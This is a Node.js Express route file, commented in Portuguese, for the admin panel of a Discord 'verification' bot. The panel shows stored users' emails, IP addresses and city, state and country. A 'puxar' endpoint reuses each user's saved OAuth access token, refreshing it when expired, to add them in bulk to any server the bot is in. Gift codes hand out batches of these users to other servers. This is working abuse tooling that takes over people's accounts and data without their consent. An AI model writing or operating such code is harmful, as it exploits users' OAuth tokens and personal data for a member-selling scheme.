const express = require('express');
const axios = require('axios');
const { renderPainel } = require('./painel');
const { fazerLogin, fazerLogout, middlewareAuth, validarSessao } = require('../adminAuth');

module.exports = (app, client, config, users) => {

    // ============================
    // PÁGINA DO PAINEL
    // ============================
    app.get('/painel', (req, res) => {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.send(renderPainel());
    });

    // ============================
    // LOGIN
    // ============================
    app.post('/api/painel/login', express.json(), (req, res) => {
        const { usuario, senha } = req.body;
        const ip = req.ip || req.connection.remoteAddress;

        if (!usuario || !senha) {
            return res.status(400).json({ error: 'Preencha tudo.' });
        }

        const result = fazerLogin(usuario, senha, ip);

        if (!result.sucesso) {
            return res.status(401).json({ error: result.erro });
        }

        res.json({ token: result.token, csrf: result.csrf });
    });

    // ============================
    // LOGOUT
    // ============================
    app.post('/api/painel/logout', middlewareAuth, (req, res) => {
        fazerLogout(req.token);
        res.json({ ok: true });
    });

    // ============================
    // STATS
    // ============================
    app.get('/api/painel/stats', middlewareAuth, async (req, res) => {
        try {
            const allUsers = await users.all();
            const gifts = (await config.get('gifts')) || {};

            const giftsArray = Object.values(gifts);
            const giftsAtivos = giftsArray.filter(g => g.status !== 'esgotado' && Date.now() <= g.expiresAt).length;
            const giftsUsados = giftsArray.filter(g => g.status === 'esgotado').length;

            // Top cidades
            const cidades = {};
            allUsers.forEach(u => {
                const cidade = u.data?.cidade;
                if (cidade && cidade !== 'Desconhecido') {
                    cidades[cidade] = (cidades[cidade] || 0) + 1;
                }
            });
            const topCidades = Object.entries(cidades)
                .sort((a, b) => b[1] - a[1])
                .slice(0, 5)
                .map(([cidade, count]) => ({ cidade, count }));

            res.json({
                total: allUsers.length,
                giftsAtivos,
                giftsUsados,
                servidores: client.guilds.cache.size,
                topCidades
            });
        } catch (err) {
            console.error('❌ [PAINEL API] stats:', err.message);
            res.status(500).json({ error: err.message });
        }
    });

    // ============================
    // USERS
    // ============================
    app.get('/api/painel/users', middlewareAuth, async (req, res) => {
        try {
            const allUsers = await users.all();
            const formatado = allUsers.map(u => ({
                id: u._id,
                username: u.data?.username || 'Desconhecido',
                avatar: u.data?.avatar || null,
                email: u.data?.email || null,
                ip: u.data?.ip || null,
                cidade: u.data?.cidade || 'Desconhecido',
                estado: u.data?.estado || 'Desconhecido',
                pais: u.data?.pais || 'Desconhecido',
                verifiedAt: u.data?.verifiedAt || null
            }));
            res.json(formatado);
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    // Desverificar
    app.delete('/api/painel/users/:id', middlewareAuth, async (req, res) => {
        try {
            const { id } = req.params;
            const guildId = process.env.GUILD_ID;
            let roleId = process.env.ROLE_ID;
            try {
                const dbRole = await config.get('roleId');
                if (dbRole) roleId = dbRole;
            } catch (e) {}

            // Remove cargo no Discord
            if (guildId && roleId) {
                try {
                    await axios.delete(
                        \`https://discord.com/api/v10/guilds/\${guildId}/members/\${id}/roles/\${roleId}\`,
                        {
                            headers: {
                                Authorization: \`Bot \${process.env.TOKEN}\`
                            },
                            validateStatus: false
                        }
                    );
                } catch (e) {}
            }

            // Remove do banco
            await users.delete(id);

            res.json({ ok: true });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    // ============================
    // GIFTS
    // ============================
    app.get('/api/painel/gifts', middlewareAuth, async (req, res) => {
        try {
            const gifts = (await config.get('gifts')) || {};
            const lista = Object.values(gifts).sort((a, b) => b.criadoEm - a.criadoEm);
            res.json(lista);
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    // Criar gift
    app.post('/api/painel/gifts', middlewareAuth, express.json(), async (req, res) => {
        try {
            const { quantidade, tempo, selecionados } = req.body;

            if (!quantidade || quantidade < 1) {
                return res.status(400).json({ error: 'Quantidade inválida.' });
            }

            const allUsers = await users.all();
            if (quantidade > allUsers.length) {
                return res.status(400).json({ error: \`Só tem \${allUsers.length} verificados.\` });
            }

            // Gera código único
            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
            let codigo;
            let tentativas = 0;
            const gifts = (await config.get('gifts')) || {};

            do {
                codigo = '';
                for (let i = 0; i < 6; i++) {
                    codigo += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                tentativas++;
            } while (gifts[codigo] && tentativas < 20);

            const expiresAt = tempo > 0 ? Date.now() + (tempo * 60 * 60 * 1000) : null;

            const gift = {
                codigo,
                quantidade,
                usados: 0,
                criadoPor: 'PAINEL',
                criadoEm: Date.now(),
                expiresAt,
                status: 'ativo',
                servidorUsado: null,
                selecionados: selecionados && selecionados.length > 0 ? selecionados : null
            };

            gifts[codigo] = gift;
            await config.set('gifts', gifts);

            const baseUrl = process.env.REDIRECT_URI
                ? process.env.REDIRECT_URI.replace('/oauth2/callback', '')
                : 'https://meubot-8p7l.onrender.com';

            const link = \`\${baseUrl}/gift/\${codigo}\`;

            res.json({ codigo, link });
        } catch (err) {
            console.error('❌ [PAINEL] criar gift:', err.message);
            res.status(500).json({ error: err.message });
        }
    });

    // Deletar gift
    app.delete('/api/painel/gifts/:codigo', middlewareAuth, async (req, res) => {
        try {
            const { codigo } = req.params;
            const gifts = (await config.get('gifts')) || {};
            delete gifts[codigo];
            await config.set('gifts', gifts);
            res.json({ ok: true });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    // ============================
    // PUXAR
    // ============================
    app.post('/api/painel/puxar', middlewareAuth, express.json(), async (req, res) => {
        try {
            const { guildId, quantidade } = req.body;

            if (!/^\d{17,20}$/.test(guildId)) {
                return res.status(400).json({ error: 'ID inválido.' });
            }

            const guild = client.guilds.cache.get(guildId);
            if (!guild) {
                return res.status(400).json({ error: 'O bot não está nesse servidor.' });
            }

            const allUsers = await users.all();
            const toPull = quantidade > 0 ? allUsers.slice(0, quantidade) : allUsers;

            // Puxa em background
            puxarBackground(client, guildId, toPull, users);

            res.json({
                mensagem: \`Puxando \${toPull.length} membros pro servidor \${guild.name}.\`
            });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    // ============================
    // SERVIDORES
    // ============================
    app.get('/api/painel/servers', middlewareAuth, (req, res) => {
        const lista = client.guilds.cache.map(g => ({
            id: g.id,
            nome: g.name,
            membros: g.memberCount,
            dono: g.ownerId
        }));
        res.json(lista);
    });

    // ============================
    // LOGS
    // ============================
    app.get('/api/painel/logs', middlewareAuth, async (req, res) => {
        try {
            const logs = (await config.get('serverLogs')) || [];
            res.json(logs.reverse().slice(0, 500));
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    // ============================
    // CONFIG
    // ============================
    app.get('/api/painel/config', middlewareAuth, async (req, res) => {
        try {
            res.json({
                logChannelId: (await config.get('logChannelId')) || '',
                giftLogChannelId: (await config.get('giftLogChannelId')) || '',
                roleId: (await config.get('roleId')) || ''
            });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    app.post('/api/painel/config', middlewareAuth, express.json(), async (req, res) => {
        try {
            const { logChannelId, giftLogChannelId, roleId } = req.body;

            if (logChannelId) await config.set('logChannelId', logChannelId);
            if (giftLogChannelId) await config.set('giftLogChannelId', giftLogChannelId);
            if (roleId) await config.set('roleId', roleId);

            res.json({ ok: true });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });
};

// ============================
// FUNÇÃO AUXILIAR — PUXAR EM BACKGROUND
// ============================
async function puxarBackground(client, guildId, userList, users) {
    let puxados = 0, falhas = 0;

    for (const u of userList) {
        const userId = u._id;
        const accessToken = u.data?.access_token;
        const refreshToken = u.data?.refresh_token;

        if (!accessToken || !userId) { falhas++; continue; }

        try {
            let resp = await axios.put(
                \`https://discord.com/api/v10/guilds/\${guildId}/members/\${userId}\`,
                { access_token: accessToken },
                {
                    headers: {
                        Authorization: \`Bot \${process.env.TOKEN}\`,
                        'Content-Type': 'application/json'
                    },
                    validateStatus: false
                }
            );

            // Tenta refresh se token inválido
            if (resp.status === 403 && resp.data?.code === 50025 && refreshToken) {
                try {
                    const params = new URLSearchParams();
                    params.append('client_id', process.env.CLIENT_ID);
                    params.append('client_secret', process.env.CLIENT_SECRET);
                    params.append('grant_type', 'refresh_token');
                    params.append('refresh_token', refreshToken);

                    const tokenResp = await axios.post(
                        'https://discord.com/api/v10/oauth2/token',
                        params,
                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
                    );

                    const newAccess = tokenResp.data.access_token;
                    const newRefresh = tokenResp.data.refresh_token;

                    await users.set(userId, {
                        ...u.data,
                        access_token: newAccess,
                        refresh_token: newRefresh
                    });

                    resp = await axios.put(
                        \`https://discord.com/api/v10/guilds/\${guildId}/members/\${userId}\`,
                        { access_token: newAccess },
                        {
                            headers: {
                                Authorization: \`Bot \${process.env.TOKEN}\`,
                                'Content-Type': 'application/json'
                            },
                            validateStatus: false
                        }
                    );
                } catch (e) {}
            }

            if (resp.status === 201 || resp.status === 204) {
                puxados++;
            } else {
                falhas++;
            }
        } catch (err) {
            falhas++;
        }

        await new Promise(r => setTimeout(r, 600));
    }

    console.log(\`✅ [PAINEL PUXAR] \${puxados} puxados, \${falhas} falhas\`);
}